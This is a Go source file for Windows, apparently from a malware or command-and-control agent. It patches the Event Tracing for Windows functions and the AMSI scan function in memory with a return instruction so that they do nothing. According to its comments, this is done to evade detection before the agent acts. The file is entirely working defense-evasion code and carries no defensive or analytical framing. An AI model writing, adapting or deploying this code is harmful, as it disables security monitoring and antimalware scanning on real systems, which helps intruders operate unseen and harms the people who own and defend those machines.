//go:build windows

package main

import (
	"syscall"
	"unsafe"
)

var (
	kernel32AP       = syscall.NewLazyDLL("kernel32.dll")
	procVirtualProtAP = kernel32AP.NewProc("VirtualProtect")
)

// autoStartupPatch patches ETW and AMSI functions at startup with a single
// 0xC3 (ret) instruction, causing them to return immediately.
// This prevents ETW-based detection and AMSI scanning before any agent activity.
func autoStartupPatch() {
	// Patch ETW first — ntdll.dll is always loaded
	patchFunctionEntry("ntdll.dll", "EtwEventWrite")
	patchFunctionEntry("ntdll.dll", "EtwEventRegister")
	// Patch AMSI — amsi.dll may not be loaded yet, but will be when CLR loads
	patchFunctionEntry("amsi.dll", "AmsiScanBuffer")
}

// patchFunctionEntry writes 0xC3 (ret) at the entry point of the specified function.
// Silently returns on any error (DLL not loaded, function not found, etc.).
func patchFunctionEntry(dllName, funcName string) {
	dll, err := syscall.LoadDLL(dllName)
	if err != nil {
		return // DLL not loaded — nothing to patch
	}
	proc, err := dll.FindProc(funcName)
	if err != nil {
		return // Function not found
	}

	addr := proc.Addr()
	var oldProtect uint32
	ret, _, _ := procVirtualProtAP.Call(addr, 1, 0x40, uintptr(unsafe.Pointer(&oldProtect)))
	if ret == 0 {
		return // VirtualProtect failed
	}

	*(*byte)(unsafe.Pointer(addr)) = 0xC3

	// Restore original protection
	procVirtualProtAP.Call(addr, 1, uintptr(oldProtect), uintptr(unsafe.Pointer(&oldProtect)))
}
